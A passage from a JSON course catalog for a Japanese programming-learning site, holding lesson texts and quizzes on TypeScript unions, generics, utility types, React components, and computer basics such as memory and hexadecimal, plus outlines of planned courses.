        "question": "interface は実行時（JavaScript になったあと）どうなる？",
        "choices": [
         "クラスとして残る",
         "消える（型チェック専用）"
        ],
        "answer": 1,
        "explain": "型の情報はコンパイル時に取り除かれます。"
       }
      ]
     ],
     "id": "03-interface-type"
    },
    {
     "title": "ユニオン型と型の絞り込み",
     "level": 2,
     "minutes": 15,
     "concepts": [
      "type_hints",
      "conditionals"
     ],
     "summary": "「A または B」を表す `|` と、if で型を確定させる書き方。",
     "body": "## このレッスンのゴール\n\n- `string | number` や `\"a\" | \"b\"` を読める\n- `typeof` や `in`、`if` で型が絞り込まれる仕組みを説明できる\n\n## ユニオン型：A または B\n\n```typescript\nlet id: string | number;\nid = 101;      // OK\nid = \"A-101\";  // OK\nid = true;     // エラー\n```\n\nPython の `str | int` と同じです。\n\n## リテラル型：決まった値だけ\n\n```typescript\ntype Status = \"loading\" | \"success\" | \"error\";\nlet status: Status = \"loading\";\nstatus = \"done\";   // エラー：その文字列は許されていない\n```\n\n**選択肢を型で決めてしまう** 書き方で、AI のコードで非常によく出てきます。\nタイプミス（`\"sucess\"` など）を実行前に見つけられるのが利点です。\n\n## 絞り込み（ナローイング）\n\nユニオン型の値は、そのままでは「どちらか分からない」ので使える操作が限られます。\n`if` で調べると、その中では型が確定します。\n\n```typescript\nfunction format(id: string | number): string {\n  if (typeof id === \"number\") {\n    return id.toFixed(0);       // ここでは id は number\n  }\n  return id.toUpperCase();      // ここでは id は string\n}\n```\n\n| 調べ方 | 例 |\n|---|---|\n| `typeof x === \"string\"` | 基本の型を調べる |\n| `x === null` / `if (x)` | null・undefined を除く |\n| `\"email\" in user` | そのキーを持っているか |\n| `x instanceof Date` | どのクラスのインスタンスか |\n| `Array.isArray(x)` | 配列か |\n\n## 判別可能なユニオン（AI がよく書く形）\n\n```typescript\ntype Result =\n  | { ok: true; data: string[] }\n  | { ok: false; error: string };\n\nfunction show(r: Result) {\n  if (r.ok) {\n    console.log(r.data);    // ok が true の形 → data がある\n  } else {\n    console.log(r.error);   // ok が false の形 → error がある\n  }\n}\n```\n\n共通のキー（ここでは `ok`、よく `type` や `kind`）で形を見分けます。\n`switch (action.type) { case \"add\": ... }` の形も同じ考え方で、React の状態管理などで頻出です。\n\n## ! と as（要注意の書き方）\n\n```typescript\nconst el = document.getElementById(\"app\")!;   // 「絶対に null じゃない」と言い切る\nconst user = data as User;                     // 「これは User だ」と言い切る\n```\n\nどちらも **TypeScript のチェックを人間の判断で黙らせる** 書き方です。間違っていると実行時にエラーになります。\nAI のコードで多用されていたら、「本当にそう言い切れる？」とチェックしたいポイントです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`type Size = \"S\" | \"M\" | \"L\"` の変数に入れられないのは？",
        "choices": [
         "\"S\"",
         "\"L\"",
         "\"XL\""
        ],
        "answer": 2,
        "explain": "リテラル型で決めた 3 つ以外は入れられません。"
       },
       {
        "question": "`if (typeof v === \"string\") { ... }` の { } の中で v の型は？",
        "choices": [
         "string",
         "string | number のまま",
         "unknown"
        ],
        "answer": 0,
        "explain": "typeof のチェックで型が絞り込まれます。"
       },
       {
        "question": "`value as User` の注意点は？",
        "choices": [
         "TypeScript のチェックを省略するので、実際に違う形ならバグになる",
         "値が自動的に User に変換される",
         "実行が遅くなる"
        ],
        "answer": 0,
        "explain": "as は変換ではなく「そうだと信じて」という宣言です。"
       }
      ]
     ],
     "id": "04-union-narrowing"
    },
    {
     "title": "関数の型と Promise の型",
     "level": 2,
     "minutes": 12,
     "concepts": [
      "type_hints",
      "functions",
      "async",
      "higher_order"
     ],
     "summary": "コールバックの型、`Promise<T>`、API 呼び出しの型付けを読む。",
     "body": "## このレッスンのゴール\n\n- `(x: number) => string` という「関数の型」を読める\n- `async` 関数の戻り値 `Promise<User[]>` の意味が分かる\n\n## 関数そのものの型\n\n```typescript\ntype Formatter = (value: number) => string;\n\nconst yen: Formatter = (v) => `${v.toLocaleString()} 円`;\n\nfunction printAll(values: number[], format: Formatter): void {\n  values.forEach((v) => console.log(format(v)));\n}\n```\n\n`(value: number) => string` は「number を受け取って string を返す関数」という **型** です。\nアロー関数と見た目が似ていますが、`=>` の右が **値ではなく型** になっている点に注意しましょう。\nPython の `Callable[[int], str]` にあたります。\n\n## オプション引数・デフォルト引数\n\n```typescript\nfunction greet(name: string, greeting?: string): string { ... }      // 省略可\nfunction greet2(name: string, greeting = \"こんにちは\"): string { ... } // 既定値（型は推論）\n```\n\n## async 関数と Promise<T>\n\n```typescript\ninterface User { id: number; name: string; }\n\nasync function fetchUsers(): Promise<User[]> {\n  const res = await fetch(\"/api/users\");\n  if (!res.ok) throw new Error(`HTTP ${res.status}`);\n  return (await res.json()) as User[];\n}\n```\n\n`Promise<User[]>` は「**あとで User の配列が届く約束**」という型です。\n`async` 関数の戻り値は必ず `Promise<...>` になり、`await` すると中身（`User[]`）が取り出せます。\n\n```typescript\nconst users = await fetchUsers();   // users の型は User[]\nconst p = fetchUsers();             // p の型は Promise<User[]>（await 忘れに気づける）\n```\n\n## ⚠️ res.json() の結果は信用できない\n\n`res.json()` の戻り値は `any`（または `unknown`）です。上の `as User[]` は「そうだと信じる」だけで、\nサーバーが違う形のデータを返しても TypeScript は気づけません。\nしっかりしたコードでは **zod** などのライブラリで実際の中身を検証します。\n\n```typescript\nimport { z } from \"zod\";\nconst UserSchema = z.object({ id: z.number(), name: z.string() });\nconst users = z.array(UserSchema).parse(await res.json());   // 形が違えばここでエラー\n```\n\nAI のコードで `zod` や `z.object` を見たら「外から来たデータを検証している」と読みましょう。\nPython の pydantic と同じ役割です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`type F = (s: string) => boolean` に合う関数は？",
        "choices": [
         "(s) => s.length > 0",
         "(n: number) => n > 0",
         "(s) => s.toUpperCase()"
        ],
        "answer": 0,
        "explain": "string を受け取り boolean を返す関数です。"
       },
       {
        "question": "`async function f(): Promise<number>` を `const x = await f()` で呼ぶと x の型は？",
        "choices": [
         "Promise<number>",
         "number"
        ],
        "answer": 1,
        "explain": "await すると Promise の中身が取り出せます。"
       },
       {
        "question": "`(await res.json()) as User[]` の弱点は？",
        "choices": [
         "実際のデータが User[] の形か、実行時には確認していない",
         "必ずエラーになる",
         "型が any になる"
        ],
        "answer": 0,
        "explain": "実行時の検証には zod などを使います。"
       }
      ]
     ],
     "id": "05-function-types-async"
    },
    {
     "title": "ジェネリクス",
     "level": 3,
     "minutes": 15,
     "concepts": [
      "generics",
      "type_hints"
     ],
     "summary": "`<T>` の読み方。型を「引数」のように受け取る仕組み。",
     "body": "## このレッスンのゴール\n\n- `<T>` が「型の引数（あとで決まる型）」だと説明できる\n- `Array<T>`、`Promise<T>`、`useState<T>` などの読み方が分かる\n\n## なぜ必要？\n\n「配列の最初の要素を返す関数」を考えます。\n\n```typescript\nfunction firstNumber(items: number[]): number { return items[0]; }\nfunction firstString(items: string[]): string { return items[0]; }\n```\n\n中身は同じなのに、型ごとに関数を作るのは無駄です。`any` を使うと型の情報が消えてしまいます。\n\n## <T> ＝ 型の引数\n\n```typescript\nfunction first<T>(items: T[]): T {\n  return items[0];\n}\n\nconst n = first([1, 2, 3]);        // T は number → n は number\nconst s = first([\"a\", \"b\"]);       // T は string → s は string\nconst u = first<User>(users);      // 明示的に指定することもできる\n```\n\n**`T` は「呼ばれたときに決まる型」の仮の名前** です。\n`first<T>(items: T[]): T` は「何かの型 T の配列を受け取り、同じ T を返す」と読みます。\n`T` 以外に `K`（キー）、`V`（値）、`TData` など意味のある名前が使われることもあります。\n\n## もう出会っているジェネリクス\n\n| 書き方 | 読み方 |\n|---|---|\n| `Array<string>` | string の配列 |\n| `Promise<User>` | あとで User が届く約束 |\n| `Record<string, number>` | キーが string・値が number の辞書 |\n| `Map<string, User>` | string → User の Map |\n| `useState<number>(0)` | number を持つ状態（React） |\n\n`<...>` を見たら「**中に入る型を指定している**」と読めば OK です。\n\n## 制約：extends\n\n```typescript\nfunction getLength<T extends { length: number }>(x: T): number {\n  return x.length;\n}\ngetLength(\"hello\");   // OK（string は length を持つ）\ngetLength([1, 2]);    // OK\ngetLength(42);        // エラー（number は length を持たない）\n```\n\n`T extends ...` は「T は何でもいいわけではなく、**この条件を満たす型** に限る」という意味です。\n\n## interface にも使える\n\n```typescript\ninterface ApiResponse<T> {\n  data: T;\n  error: string | null;\n}\n\nconst res: ApiResponse<User[]> = { data: [], error: null };\n```\n\nAPI の返り値の「外枠は共通、中身だけ違う」という形でよく使われます。\n\n## Python では\n\n```python\ndef first[T](items: list[T]) -> T:   # Python 3.12 以降の書き方\n    return items[0]\n```\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`function wrap<T>(x: T): T[]` を `wrap(\"a\")` で呼ぶと戻り値の型は？",
        "choices": [
         "string[]",
         "string",
         "T[]"
        ],
        "answer": 0,
        "explain": "T が string に決まるので T[] は string[] です。"
       },
       {
        "question": "`ApiResponse<Product>` の `data` の型は？",
        "choices": [
         "ApiResponse",
         "Product",
         "T"
        ],
        "answer": 1,
        "explain": "T に Product が入ります。"
       },
       {
        "question": "`<T extends { id: number }>` の意味は？",
        "choices": [
         "T は id: number を持つ型に限られる",
         "T は id という名前の型",
         "T を id に変換する"
        ],
        "answer": 0,
        "explain": "extends はジェネリクスでは「制約」の意味です。"
       }
      ]
     ],
     "id": "06-generics"
    },
    {
     "title": "ユーティリティ型",
     "level": 3,
     "minutes": 12,
     "concepts": [
      "generics",
      "type_hints"
     ],
     "summary": "Partial・Pick・Omit・keyof など、既存の型から新しい型を作る道具。",
     "body": "## このレッスンのゴール\n\n- `Partial` / `Pick` / `Omit` / `Required` の意味が分かる\n- `keyof` と `typeof` を読める\n\n## 既存の型から作る\n\n```typescript\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n  password: string;\n}\n```\n\nこの `User` をもとに、場面ごとの型を作れます。\n\n| 書き方 | 意味 | 使われる場面 |\n|---|---|---|\n| `Partial<User>` | すべての項目を省略可能に | 一部だけ更新するとき |\n| `Required<User>` | すべての項目を必須に | |\n| `Pick<User, \"id\" \\| \"name\">` | 指定した項目だけ | 一覧表示用 |\n| `Omit<User, \"password\">` | 指定した項目を除く | 外に返すとき（秘密を除く） |\n| `Readonly<User>` | すべて書き換え禁止 | |\n\n```typescript\nfunction updateUser(id: number, changes: Partial<User>) { ... }\nupdateUser(1, { name: \"新しい名前\" });   // 一部だけでも OK\n\ntype PublicUser = Omit<User, \"password\">;   // パスワードを外に出さない型\n```\n\n`Omit<User, \"password\">` のような型は、**セキュリティの意図が型に表れている** 例です。\n\n## keyof：キーの一覧を型にする\n\n```typescript\ntype UserKey = keyof User;   // \"id\" | \"name\" | \"email\" | \"password\"\n\nfunction getField(user: User, key: keyof User) {\n  return user[key];\n}\ngetField(u, \"name\");   // OK\ngetField(u, \"nmae\");   // エラー（タイプミスを防げる）\n```\n\n## typeof：値から型を作る\n\n```typescript\nconst defaultConfig = { theme: \"dark\", fontSize: 14 };\ntype Config = typeof defaultConfig;   // { theme: string; fontSize: number }\n```\n\nJavaScript の `typeof x === \"string\"`（実行時の判定）とは別物で、\n**型の位置に書かれた `typeof` は「この値の型」** という意味です。\n\n## as const\n\n```typescript\nconst COLORS = [\"red\", \"green\", \"blue\"] as const;\ntype Color = (typeof COLORS)[number];   // \"red\" | \"green\" | \"blue\"\n```\n\n`as const` は「この値を変更しない。型もリテラルのまま扱って」という指定です。\n選択肢の一覧から型を作るテクニックで、AI のコードでときどき見かけます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`Omit<User, \"password\">` の型が持たない項目は？",
        "choices": [
         "id",
         "name",
         "password"
        ],
        "answer": 2,
        "explain": "Omit は指定した項目を取り除きます。"
       },
       {
        "question": "`Partial<Product>` の変数に `{}`（空オブジェクト）を入れられる？",
        "choices": [
         "入れられる",
         "入れられない"
        ],
        "answer": 0,
        "explain": "Partial はすべての項目を省略可能にします。"
       },
       {
        "question": "`keyof { a: number; b: string }` は？",
        "choices": [
         "\"a\" | \"b\"",
         "number | string",
         "{ a: number; b: string }"
        ],
        "answer": 0,
        "explain": "keyof はキー名のユニオン型を作ります。"
       }
      ]
     ],
     "id": "07-utility-types"
    },
    {
     "title": "React コンポーネントを読む（TSX）",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "dom_ui",
      "type_hints",
      "functions",
      "generics"
     ],
     "summary": "AI が最もよく書く TypeScript の形、React の .tsx ファイルを読み解く。",
     "body": "## このレッスンのゴール\n\n- JSX（HTML のような部分）が「画面の設計図を返している」と説明できる\n- Props の型、`useState`、`useEffect` の役割を読める\n\n## コンポーネント＝画面の部品を返す関数\n\n```tsx\ntype GreetingProps = {\n  name: string;\n  count?: number;\n};\n\nexport function Greeting({ name, count = 0 }: GreetingProps) {\n  return (\n    <div className=\"greeting\">\n      <h1>こんにちは、{name}さん</h1>\n      {count > 0 && <p>{count} 件の通知があります</p>}\n    </div>\n  );\n}\n```\n\n| 部分 | 読み方 |\n|---|---|\n| `GreetingProps` | この部品が受け取るデータ（**Props**）の型 |\n| `({ name, count = 0 }: GreetingProps)` | Props を分割代入で受け取る（JS コースの「分割代入」） |\n| `return ( <div>...</div> )` | 画面の設計図（**JSX**）を返す |\n| `{name}` | JSX の中の `{ }` は JavaScript の式（f-string の `{ }` と同じ感覚） |\n| `className` | HTML の `class`（JS の予約語と被るので名前が違う） |\n| `{条件 && <p>...</p>}` | 条件が真のときだけ表示する定番の書き方 |\n\n使う側は HTML のタグのように書きます：`<Greeting name=\"Ryo\" count={3} />`\n\n## useState：変化するデータ（状態）\n\n```tsx\nimport { useState } from \"react\";\n\nexport function Counter() {\n  const [count, setCount] = useState<number>(0);\n\n  return (\n    <button onClick={() => setCount(count + 1)}>\n      {count} 回押された\n    </button>\n  );\n}\n```\n\n- `useState<number>(0)`：初期値 0 の **状態** を作る（`<number>` はジェネリクス）\n- `[count, setCount]`：今の値と、値を変える関数（配列の分割代入）\n- `setCount(...)` を呼ぶと、**React が自動で画面を描き直す**\n\nDOM を直接書き換えた JavaScript コースとの一番の違いはここです。\n**「状態を変える → 画面は React が勝手に更新」** と読みましょう。\n\n## リストを表示する：map\n\n```tsx\ntype Todo = { id: number; title: string; done: boolean };\n\nfunction TodoList({ todos }: { todos: Todo[] }) {\n  return (\n    <ul>\n      {todos.map((todo) => (\n        <li key={todo.id}>{todo.done ? \"✅\" : \"⬜\"} {todo.title}</li>\n      ))}\n    </ul>\n  );\n}\n```\n\n配列の `map` で `<li>` を量産しています。`key` は React が要素を見分けるための目印です。\n\n## useEffect：表示されたあとに何かする\n\n```tsx\nconst [users, setUsers] = useState<User[]>([]);\n\nuseEffect(() => {\n  fetchUsers().then(setUsers);\n}, []);   // [] ＝ 最初の 1 回だけ実行\n```\n\n「画面が表示されたら API からデータを取ってきて、状態に入れる」という定番の形です。\n最後の `[]` は **いつ実行し直すか**（依存配列）。`[userId]` なら userId が変わるたびに実行されます。\n\n## 読む順番のコツ\n\n1. Props の型（何を受け取る部品か）\n2. `useState`（どんなデータが変化するか）\n3. `return` の JSX（画面の形）\n4. イベント（`onClick` など）と `useEffect`（いつ何が起きるか）\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`<UserCard user={u} />` と書いたとき、UserCard 関数が受け取るのは？",
        "choices": [
         "{ user: u } という Props",
         "u そのもの",
         "何も受け取らない"
        ],
        "answer": 0,
        "explain": "属性がまとめて Props オブジェクトとして渡されます。"
       },
       {
        "question": "`setCount(5)` を呼ぶと何が起きる？",
        "choices": [
         "count が 5 になり、React が画面を描き直す",
         "count が 5 になるが画面はそのまま",
         "DOM を自分で書き換える必要がある"
        ],
        "answer": 0,
        "explain": "状態を変えると React が自動で再描画します。"
       },
       {
        "question": "`useEffect(() => { ... }, [])` の中身はいつ実行される？",
        "choices": [
         "部品が最初に表示されたときの 1 回",
         "画面が描き直されるたび毎回",
         "ボタンが押されたとき"
        ],
        "answer": 0,
        "explain": "依存配列が空なので最初の 1 回だけです。"
       },
       {
        "question": "JSX の `{isAdmin && <AdminMenu />}` の意味は？",
        "choices": [
         "isAdmin が真のときだけ AdminMenu を表示",
         "isAdmin と AdminMenu を両方表示",
         "isAdmin に AdminMenu を代入"
        ],
        "answer": 0,
        "explain": "&& による条件付き表示の定番パターンです。"
       }
      ]
     ],
     "id": "08-react-components"
    }
   ],
   "status": "open"
  },
  {
   "title": "HTML / CSS",
   "icon": "🎨",
   "order": 40,
   "status": "planned",
   "description": "Web ページの骨組みと見た目。",
   "outline": [
    "タグと要素",
    "クラスと ID",
    "セレクタ",
    "Flexbox と Grid",
    "レスポンシブ"
   ],
   "id": "40-html-css",
   "lessons": []
  },
  {
   "title": "SQL",
   "icon": "🗄️",
   "order": 50,
   "status": "planned",
   "description": "データベースに問い合わせる言語。AI がよく書くバックエンドの必需品。",
   "outline": [
    "SELECT と WHERE",
    "並べ替えと集計",
    "JOIN",
    "INSERT / UPDATE / DELETE",
    "インデックスとトランザクション"
   ],
   "id": "50-sql",
   "lessons": []
  },
  {
   "title": "シェル（Bash）",
   "icon": "💻",
   "order": 60,
   "status": "planned",
   "description": "ターミナルのコマンド。AI が「これを実行して」と出してくるもの。",
   "outline": [
    "パスとディレクトリ",
    "よく使うコマンド",
    "パイプとリダイレクト",
    "環境変数",
    "危ないコマンドの見分け方"
   ],
   "id": "60-shell",
   "lessons": []
  },
  {
   "title": "Go",
   "icon": "🐹",
   "order": 70,
   "status": "planned",
   "description": "シンプルで速い、サーバー向けの言語。",
   "outline": [
    "パッケージと main",
    "静的型と := ",
    "構造体とメソッド",
    "エラーを値で返す",
    "goroutine と channel"
   ],
   "id": "70-go",
   "lessons": []
  },
  {
   "title": "Rust",
   "icon": "🦀",
   "order": 80,
   "status": "planned",
   "description": "安全さと速さを両立する言語。所有権という独特の考え方がある。",
   "outline": [
    "let と mut",
    "所有権と借用",
    "enum と match",
    "Result と ? 演算子",
    "トレイト"
   ],
   "id": "80-rust",
   "lessons": []
  },
  {
   "title": "PHP",
   "icon": "🐘",
   "order": 90,
   "category": "language",
   "status": "planned",
   "description": "WordPress や Laravel で使われる Web サーバーの言語。既存サイトを触るときに出会う。",
   "outline": [
    "<?php と echo",
    "変数の $ と配列",
    "関数とクラス",
    "フォームとデータベース",
    "WordPress のテーマを読む"
   ],
   "id": "90-php",
   "lessons": []
  },
  {
   "title": "Java",
   "icon": "☕",
   "order": 91,
   "category": "language",
   "status": "planned",
   "description": "銀行や企業の業務システム、Android で使われる言語。型をしっかり書く。",
   "outline": [
    "クラスと main メソッド",
    "静的型と変数宣言",
    "クラス・インターフェース",
    "例外処理",
    "コレクションと Stream"
   ],
   "id": "91-java",
   "lessons": []
  },
  {
   "title": "C 言語",
   "icon": "🔧",
   "order": 92,
   "category": "language",
   "status": "planned",
   "description": "多くの言語の祖先。マイコンや OS など、機械に近い所で使われる。",
   "outline": [
    "main 関数と printf",
    "型とメモリ",
    "ポインタ",
    "配列と文字列",
    "malloc と free"
   ],
   "id": "92-c",
   "lessons": []
  },
  {
   "title": "C++",
   "icon": "⚙️",
   "order": 93,
   "category": "language",
   "status": "planned",
   "description": "C を拡張した言語。ゲーム（Unreal Engine）や高速な処理で使われる。",
   "outline": [
    "C との違い",
    "クラスと参照",
    "STL（vector・map）",
    "スマートポインタ",
    "テンプレート"
   ],
   "id": "93-cpp",
   "lessons": []
  },
  {
   "title": "C#",
   "icon": "🟪",
   "order": 94,
   "category": "language",
   "status": "planned",
   "description": "Unity のゲーム開発や Windows アプリで使われる言語。",
   "outline": [
    "クラスと名前空間",
    "プロパティ",
    "LINQ",
    "async/await",
    "Unity のスクリプトを読む"
   ],
   "id": "94-csharp",
   "lessons": []
  },
  {
   "title": "Kotlin",
   "icon": "🟣",
   "order": 95,
   "category": "language",
   "status": "planned",
   "description": "Android アプリ開発の標準言語。Java を簡潔にしたような書き方。",
   "outline": [
    "val と var",
    "null 安全",
    "data class",
    "ラムダとコレクション操作",
    "Jetpack Compose を読む"
   ],
   "id": "95-kotlin",
   "lessons": []
  },
  {
   "title": "Swift",
   "icon": "🕊️",
   "order": 96,
   "category": "language",
   "status": "planned",
   "description": "iPhone・Mac アプリの言語。",
   "outline": [
    "let と var",
    "オプショナル",
    "struct と class",
    "クロージャ",
    "SwiftUI を読む"
   ],
   "id": "96-swift",
   "lessons": []
  },
  {
   "title": "Ruby",
   "icon": "💎",
   "order": 97,
   "category": "language",
   "status": "planned",
   "description": "日本生まれの言語。Ruby on Rails の Web アプリで使われる。",
   "outline": [
    "変数とメソッド",
    "ブロックと each",
    "シンボルとハッシュ",
    "クラス",
    "Rails のコードを読む"
   ],
   "id": "97-ruby",
   "lessons": []
  },
  {
   "title": "ターミナルと Git をくわしく",
   "icon": "🌳",
   "order": 120,
   "category": "topic",
   "status": "planned",
   "description": "コマンドライン操作と Git を一歩深く。ブランチ運用やトラブル対応。",
   "outline": [
    "ディレクトリとパス",
    "よく使うコマンド",
    "ブランチとマージ",
    "コンフリクトの直し方",
    "プルリクエストとレビュー"
   ],
   "id": "120-terminal-git",
   "lessons": []
  },
  {
   "title": "セキュリティの基本",
   "icon": "🔐",
   "order": 130,
   "category": "topic",
   "status": "planned",
   "description": "AI のコードで見落としがちな危険を知る。",
   "outline": [
    "パスワードとハッシュ",
    "XSS",
    "SQL インジェクション",
    "認証と認可",
    "依存ライブラリの脆弱性"
   ],
   "id": "130-security",
   "lessons": []
  },
  {
   "title": "データベース設計",
   "icon": "🗃️",
   "order": 140,
   "category": "topic",
   "status": "planned",
   "description": "テーブルの分け方と、データの関係の表し方。SQL コースの次に。",
   "outline": [
    "テーブルと主キー",
    "1 対多・多対多",
    "正規化",
    "インデックス",
    "ORM を読む"
   ],
   "id": "140-database-design",
   "lessons": []
  },
  {
   "title": "公開とクラウド",
   "icon": "☁️",
   "order": 150,
   "category": "topic",
   "status": "planned",
   "description": "作ったものをインターネットに公開する仕組み。",
   "outline": [
    "ローカルと本番",
    "ホスティングとサーバーレス",
    "ドメインと HTTPS",
    "環境変数と設定",
    "Docker の基本"
   ],
   "id": "150-deploy-cloud",
   "lessons": []
  },
  {
   "title": "コンピュータの基礎",
   "icon": "💻",
   "order": 160,
   "category": "topic",
   "description": "プログラムが動く土台。CPU とメモリ、2 進数、ファイル、数値の誤差、文字コード、プロセスとスレッド。AI のコードの「なぜ遅い？なぜ化ける？なぜずれる？」が分かるようになる。",
   "levels": {
    "1": "入門：中身をのぞく",
    "2": "基礎：つまずきの正体"
   },
   "id": "160-computer-basics",
   "lessons": [
    {
     "title": "CPU・メモリ・ストレージ ― 作業机のたとえ",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "hardware",
      "performance"
     ],
     "summary": "プログラムを動かす 3 つの部品の役割と、「メモリが足りない」「重い」が起きる理由。",
     "body": "## このレッスンのゴール\n\n- CPU・メモリ・ストレージの役割を、たとえを使って説明できる\n- 「プログラムを実行する」とき、この 3 つの間で何が起きているか分かる\n- AI のコードで、メモリを使いすぎる書き方に気づける\n\n## 3 つの部品は「作業する人・机・本棚」\n\n| 部品 | たとえ | 役割 | 電源を切ると |\n|---|---|---|---|\n| **CPU** | 作業する人 | 計算・比較・命令の実行 | — |\n| **メモリ（RAM）** | 作業机 | 今使っているデータとプログラムを置く場所。**速いが狭い** | **消える** |\n| **ストレージ**（SSD・HDD） | 本棚 | ファイルをしまっておく場所。**広いが遅い** | 残る |\n\nパソコンの「メモリ 16GB・SSD 512GB」は、「机の広さが 16GB、本棚の広さが 512GB」という意味です。\n\n## プログラムを実行すると何が起きるか\n\n```text\n① ダブルクリック（または python main.py）\n② ストレージ（本棚）から、プログラムとデータをメモリ（机）に運ぶ\n③ CPU（人）が、机の上の命令を 1 つずつ読んで実行する\n④ 結果をファイルに保存するときは、またストレージ（本棚）に戻す\n```\n\nPython の変数（`x = 10`）は、**メモリの上に置かれた値に名前を付けたもの** です。だからプログラムを終了すると変数の中身は消え、残したいものはファイルやデータベース（ストレージ）に保存します。\n\n## どれくらい速さが違うのか\n\n正確な数字は機械によって違いますが、だいたいの感覚はこうです。\n\n| どこから読む | 1 回にかかる時間の目安 | 人間の感覚に直すと |\n|---|---|---|\n| CPU の中（キャッシュ） | 1 ナノ秒前後 | 1 秒 |\n| メモリ | 100 ナノ秒前後 | 1〜2 分 |\n| SSD | 数十〜100 マイクロ秒前後 | 1 日 |\n| インターネットの向こうのサーバー | 数十〜数百ミリ秒 | 数年 |\n\n（1 ミリ秒 = 1000 マイクロ秒 = 100 万ナノ秒）\n\nここから分かる大事なこと：**「ファイルを読む」「ネットワークにアクセスする」は、計算に比べてものすごく遅い**。\nバックエンドコースのレッスン 14（N+1 問題）で、データベースへの問い合わせを 1 回にまとめると速くなったのは、この差のためです。\n\n## 机が狭いと何が起きるか\n\nメモリが足りなくなると、OS（Windows や macOS）は机の上のものを一時的に本棚へ逃がして、なんとか続けようとします（スワップ）。本棚は遅いので、**パソコン全体が急に重くなります**。それでも足りないと、プログラムが止まります。\n\n```python\nimport sys\nprint(sys.getsizeof(list(range(1_000_000))))   # 8000056（約 8MB。中身の数値はこれとは別に必要）\n```\n\nPython のリストは、100 万個の数値を入れると、**入れ物だけで約 8MB** 使います（実際に実行して確認）。何千万件にもなると、机からあふれます。\n\n## AI のコードではこう出てくる\n\n大きなファイルを扱うコードは、**一度に全部を机に広げているか** を見ます。\n\n```python\n# ⚠️ ファイル全体を一度にメモリに読み込む\nwith open(\"huge.log\", encoding=\"utf-8\") as f:\n    lines = f.readlines()          # 10GB のファイルなら 10GB 以上の机が必要\nfor line in lines:\n    ...\n\n# ✅ 1 行ずつ読む（机に置くのは常に 1 行分だけ）\nwith open(\"huge.log\", encoding=\"utf-8\") as f:\n    for line in f:\n        ...\n```\n\n| 書き方 | メモリ | 向いている場面 |\n|---|---|---|\n| `f.read()` / `f.readlines()` | ファイル全体分 | 小さい設定ファイルなど |\n| `for line in f:` | 1 行分 | ログ・CSV など大きくなりうるファイル |\n| `pandas.read_csv(..., chunksize=10000)` | 1 万行分ずつ | 大きな CSV をまとめて処理するとき |\n\nJavaScript（Node.js）でも同じで、`fs.readFileSync` は全部読み込み、`fs.createReadStream` は少しずつ読みます。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "電源を切ると中身が消えるのはどれ？",
        "choices": [
         "SSD",
         "メモリ（RAM）",
         "HDD"
        ],
        "answer": 1,
        "explain": "メモリは作業机です。速い代わりに、電源が切れると内容が消えます。残したいものはストレージに保存します。"
       },
       {
        "question": "プログラムが遅いとき、まず疑うべきことは？",
        "choices": [
         "CPU の足し算が遅い",
         "ファイルやネットワークへのアクセスを何度もしている",
         "変数の名前が長い"
        ],
        "answer": 1,
        "explain": "計算に比べて、ストレージやネットワークへのアクセスは何万倍も遅いです。回数を減らすのが一番効きます。"
       },
       {
        "question": "10GB のログファイルを処理するコードとして安全なのは？",
        "choices": [
         "`lines = f.readlines()` で全部読んでから処理する",
         "`text = f.read()` で 1 つの文字列にする",
         "`for line in f:` で 1 行ずつ処理する"
        ],
        "answer": 2,
        "explain": "1 行ずつなら、メモリに置くのは常に 1 行分だけで済みます。"
       }
      ]
     ],
     "id": "01-cpu-memory"
    },
    {
     "title": "2 進数・16 進数とデータの量",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "encoding",
      "types"
     ],
     "summary": "コンピュータの中は 0 と 1。ビットとバイト、KB と KiB、AI のコードに出てくる 0b・0x・#ff8800 の読み方。",
     "body": "## このレッスンのゴール\n\n- ビット・バイトと、KB・MB・GB の関係を説明できる\n- 2 進数・16 進数の数を、10 進数に直せる（または Python で直し方が分かる）\n- コードに出てくる `0b1010`・`0xff`・`#ff8800` が何か分かる\n\n## コンピュータの中は 0 と 1\n\nコンピュータの部品は、電気が「流れている／流れていない」の 2 つの状態しか区別できません。そこで、すべてのデータを **0 と 1 の並び** で表します。\n\n| 単位 | 中身 | 表せる種類 |\n|---|---|---|\n| **ビット（bit）** | 0 か 1 の 1 つ | 2 通り |\n| **バイト（byte）** | 8 ビット | 2⁸ = **256 通り**（0〜255） |\n\n8 ビット = 1 バイトが、データの大きさを数える基本の単位です。\n\n## 2 進数：2 になったら繰り上がる\n\n10 進数は「10 で繰り上がる」、2 進数は「2 で繰り上がる」数え方です。\n\n| 10 進数 | 0 | 1 | 2 | 3 | 4 | 5 | … | 10 | 255 |\n|---|---|---|---|---|---|---|---|---|---|\n| 2 進数 | 0 | 1 | 10 | 11 | 100 | 101 | … | 1010 | 11111111 |\n\n```python\nprint(bin(10))              # '0b1010'  10 進数 → 2 進数\nprint(int(\"1010\", 2))       # 10        2 進数の文字列 → 10 進数\nprint(format(5, \"08b\"))     # '00000101' 8 桁にそろえる\n```\n\n`0b` は「この後は 2 進数」という目印です。\n\n## 16 進数：2 進数を短く書く方法\n\n2 進数は桁が多すぎて読みにくいので、**4 ビットずつまとめて 1 文字** にした 16 進数がよく使われます。0〜9 の次は a〜f（10〜15）です。\n\n| 2 進数 | 0000 | 1001 | 1010 | 1111 | 1111 1111 |\n|---|---|---|---|---|---|\n| 16 進数 | 0 | 9 | a | f | ff |\n| 10 進数 | 0 | 9 | 10 | 15 | 255 |\n\n**1 バイト（8 ビット）は 16 進数のちょうど 2 文字**（00〜ff）になります。\n\n```python\nprint(hex(255))          # '0xff'\nprint(int(\"ff\", 16))     # 255\nprint(0xff)              # 255   ← コードの中に 16 進数で直接書ける\n```\n\n### コードのあちこちに出てくる 16 進数\n\n| 見かける場所 | 例 | 意味 |\n|---|---|---|\n| CSS の色 